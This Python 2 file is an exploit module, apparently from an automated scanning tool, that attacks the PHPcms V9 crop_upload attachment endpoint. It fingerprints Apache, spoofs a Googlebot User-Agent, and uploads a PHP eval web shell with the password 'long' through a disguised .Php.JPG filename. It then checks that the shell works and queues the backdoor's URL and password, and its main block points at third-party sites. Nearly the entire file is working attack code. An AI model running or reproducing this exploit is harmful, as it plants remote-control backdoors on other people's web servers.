#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#aspcms注入漏洞及后台文件权限未验证
#PHPcms V9 任意文件读取漏洞
#http://www.wooyun.org/bugs/wooyun-2013-019299
import httplib
import sys
import threading
import re
import urllib2

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs


class phpcmsv9_getshell:
#    def __init__(self,url):
#        threading.Thread.__init__(self)
#        self.url=url  #URL
#        self.scan(self.url)
#        #print "%s close--phpcmsv9_getshell!!!!!"%(self.url)

    def assign(self,service, arg=None):
        if service == 'PHPcmsV9':
            return True, arg

    def scan(self,arg):
        try:
            self.url0, self.url1 = arg
            html = urllib2.urlopen(self.url1,timeout=10).info()['Server']
            if 'pache' in html:  #判断是否安装了apache
                self.dir(self.url1)
            else:
                #print '\n亲！此网站不是apache的网站!'
                return 0
        except Exception,e:
            #print e
            return 0

    def dir(self,arg):#创建个文件
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            data = 'i am just test'
            url = arg.split('//')[1]
            site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=shaoxiao.jpg'
            conn = httplib.HTTPConnection(url)
            conn.request('POST',site,data,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            if html:
                self.getshell(arg)
            return 1
        except Exception,e:
            #print e
            return 0

    def getshell(self,arg):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            #data = "test<?php @eval($_POST[\''.'shaoxiao'.'\']);?>'"
            data="<?php @eval($_POST['long']);?>"
            url = arg.split('//')[1]
            site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file='+self.url1+'/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php'
            conn = httplib.HTTPConnection(url)
            conn.request('POST',site,data,headers)
            httpres = conn.getresponse()
            html = httpres.read()
            #print html
            if httpres.status == 200 and html:
                gets = re.compile('http://(.*?)\.Php\.JPG\s')
                get = gets.findall(html)
                if get:
                    data='http://'+get[0]+'.Php.JPG%20%20%20%20%20%20%20Php'          #Pass:long
                    if yijuhua_cs("php",data,"long"):   #ASP还是PHP  ,URL地址 ，密码
                    #是
                        EXP_list=[1,self.url0,self.url1,"CN_exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                        #print EXP_list
                        url_exp.put(EXP_list,0.5)   #插入队列

                    else:
                    #否
                        EXP_list=[0,self.url0,self.url1,"CN_exp_phpcmsv9_getshell",data,"long","webshell"]
                        #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                        #print EXP_list
                        url_exp.put(EXP_list,0.5)   #插入队列
                    #print "exp_phpcmsv9_getshell---%s---%s"%(data,"webshell--pass:long")
            return 1
        except Exception,e:
            #print e
            return 0



################################################
if __name__=='__main__':
    class_www=phpcmsv9_getshell()
    class_www.scan(class_www.assign('PHPcmsV9', ("http://www.baidu.com","http://www.ranpeng.com.cn"))[1])


